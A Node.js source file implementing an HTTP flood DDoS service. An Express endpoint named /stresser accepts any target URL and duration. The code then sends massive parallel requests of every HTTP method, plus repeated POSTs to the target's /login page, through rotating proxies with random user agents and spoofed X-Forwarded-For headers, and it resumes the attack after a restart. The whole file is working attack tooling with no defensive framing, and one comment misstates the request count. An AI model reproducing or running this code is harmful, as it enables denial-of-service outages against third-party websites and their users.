const express = require("express");
const { request } = require("undici");
const fs = require("fs").promises;
const path = require("path");
const { SocksProxyAgent } = require("socks-proxy-agent");
const { HttpsProxyAgent } = require("https-proxy-agent");
const { rainbow } = require("gradient-string");
const { fakeState } = require("./fakeState.js");
const randomUseragent = require("random-useragent");

const app = express();
app.use(express.json());

const stateFilePath = path.join(__dirname, "attackState.json");
const proxyFilePath = path.join(__dirname, "proxy.txt");

// Configuration
const numThreads = 10000; // High thread count to maximize parallel requests
const httpMethods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"];
const requestsPerMethod = 1000000; // Send 10 requests per HTTP method per iteration

// State Management
const ensureStateFileExists = async () => {
    try {
        await fs.access(stateFilePath);
    } catch {
        await fs.writeFile(stateFilePath, JSON.stringify({ continueAttack: false, startTime: null, duration: 0, targetUrl: null }));
    }
};

const saveState = async (state) => {
    try {
        await fs.writeFile(stateFilePath, JSON.stringify(state, null, 2));
    } catch (err) {
        console.error("Failed to save state:", err.message);
    }
};

const loadState = async () => {
    await ensureStateFileExists();
    try {
        const data = await fs.readFile(stateFilePath, "utf-8");
        const state = JSON.parse(data);
        if (
            state &&
            typeof state.continueAttack === "boolean" &&
            state.targetUrl &&
            /^https?:\/\//.test(state.targetUrl) &&
            Number.isInteger(state.startTime) &&
            Number.isInteger(state.duration)
        ) {
            return state;
        }
        return { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
    } catch (err) {
        console.error("Failed to load state:", err.message);
        return { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
    }
};

let attackState = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };

const initializeState = async () => {
    attackState = await loadState();
    attackState.continueAttack = attackState.continueAttack && attackState.startTime && attackState.duration && Date.now() <= attackState.startTime + attackState.duration;
};

const langHeaders = ["en-US,en;q=0.9", "fr-FR,fr;q=0.9"];
const acceptHeaders = ["text/html,application/xhtml+xml,*/*;q=0.8", "application/json,*/*"];

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];

const sanitizeUA = (userAgent) => {
    if (!userAgent || typeof userAgent !== "string") {
        return randomUseragent.getRandom() || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36";
    }
    return userAgent.replace(/[^\x20-\x7E]/g, "");
};

const generateRandomPath = () => {
    const paths = ["create", "home", "about", "products", "services", "blog", "contact", `page-${Math.floor(Math.random() * Number.MAX_SAFE_INTEGER)}`];
    return `/${getRandomElement(paths)}`;
};

const createHeaders = (url) => {
    const urlObj = new URL(url);
    const origin = `${urlObj.protocol}//${urlObj.host}`;
    const referer = Math.random() > 0.5 ? url : `${origin}${generateRandomPath()}`;

    return {
        "User-Agent": sanitizeUA(randomUseragent.getRandom()),
        "Accept": getRandomElement(acceptHeaders),
        "Accept-Language": getRandomElement(langHeaders),
        "Origin": origin,
        "Referer": referer,
        "Connection": "keep-alive",
        "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
    };
};

const loadProxies = async () => {
    try {
        const data = await fs.readFile(proxyFilePath, "utf-8");
        return data.split("\n").map((line) => line.trim()).filter((line) => line);
    } catch {
        return [];
    }
};

const generateRandomPayload = () => ({
    data: { id: Math.random().toString(36).substring(7) }, // Keep payload lightweight
    contentType: "application/json",
});

const randomAttack = async (url, agent) => {
    if (!attackState.continueAttack || !url) return;

    const headers = createHeaders(url);
    const { data: payload, contentType } = generateRandomPayload();
    headers["Content-Type"] = contentType;

    const requests = [];
    httpMethods.forEach((method) => {
        for (let i = 0; i < requestsPerMethod; i++) { // Send multiple requests per method
            requests.push(
                request(url, {
                    method,
                    headers,
                    body: method !== "GET" && method !== "HEAD" ? JSON.stringify(payload) : undefined,
                    dispatcher: agent,
                    maxRedirections: 0,
                }).catch((err) => {
                    if (err.code === "ECONNRESET" || err.code === "ETIMEDOUT") return;
                    if (err.response?.statusCode === 503) console.log(rainbow("Target under heavy load (503)!"));
                })
            );
        }
    });

    await Promise.all(requests);
    process.nextTick(() => randomAttack(url, agent));
};

const performAttack = async (url, agent) => {
    if (!attackState.continueAttack || !url) return;

    const headers = createHeaders(url);

    const requests = [];
    for (let i = 0; i < requestsPerMethod; i++) { // Send multiple requests
        requests.push(
            request(`${url.match(/^(https?:\/\/[^\/]+)/)[0]}/login`, {
                method: "POST",
                headers: { ...headers, "Content-Type": "application/json" },
                body: JSON.stringify({ state: fakeState() }),
                dispatcher: agent,
                maxRedirections: 0,
            }),
            request(url, {
                method: "GET",
                headers,
                dispatcher: agent,
                maxRedirections: 0,
            })
        );
    }

    await Promise.all(requests.flat().map((req) => req.catch(() => {})));
    process.nextTick(() => performAttack(url, agent));
};

const startAttack = async (url, durationHours) => {
    if (!url || !/^https?:\/\//.test(url)) {
        console.error("Invalid URL provided.");
        return;
    }

    const proxies = await loadProxies();
    if (!proxies.length) {
        console.error("No proxies found. Add proxies to proxy.txt.");
        return;
    }

    attackState = {
        continueAttack: true,
        targetUrl: url,
        startTime: Date.now(),
        duration: durationHours * 60 * 60 * 1000,
    };
    await saveState(attackState);

    setTimeout(() => {
        attackState.continueAttack = false;
        console.log(rainbow("Attack duration completed."));
        fs.unlink(stateFilePath).catch(() => {});
    }, attackState.duration);

    for (let i = 0; i < Math.min(numThreads, proxies.length); i++) {
        if (!attackState.continueAttack) break;

        const randomProxy = getRandomElement(proxies);
        const proxyParts = randomProxy.split(":");
        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
        const agent = proxyProtocol === "socks5"
            ? new SocksProxyAgent(proxyUrl, { maxSockets: 1000 })
            : new HttpsProxyAgent(proxyUrl, { maxSockets: 1000 });

        performAttack(url, agent);
        randomAttack(url, agent);
    }
};

app.get("/stresser", async (req, res) => {
    const url = req.query.url;
    const durationHours = parseFloat(req.query.duration) || Number.MAX_SAFE_INTEGER / (60 * 60 * 1000);

    if (!url || !/^https?:\/\//.test(url)) {
        return res.status(400).json({ error: "Invalid URL." });
    }
    if (isNaN(durationHours) || durationHours <= 0) {
        return res.status(400).json({ error: "Invalid duration." });
    }

    res.json({ message: "Starting MAXIMUM DDOS ATTACK with ALL METHODS..." });
    await startAttack(url, durationHours);
});

const port = process.env.PORT || 25694;
app.listen(port, async () => {
    console.log(rainbow(`API running on http://localhost:${port}`));
    await initializeState();
    if (attackState.continueAttack && attackState.targetUrl) {
        console.log(rainbow("Resuming previous attack..."));
        const remainingDuration = (attackState.startTime + attackState.duration - Date.now()) / (60 * 60 * 1000);
        if (remainingDuration > 0) {
            await startAttack(attackState.targetUrl, remainingDuration);
        } else {
            attackState.continueAttack = false;
            fs.unlink(stateFilePath).catch(() => {});
        }
    }
});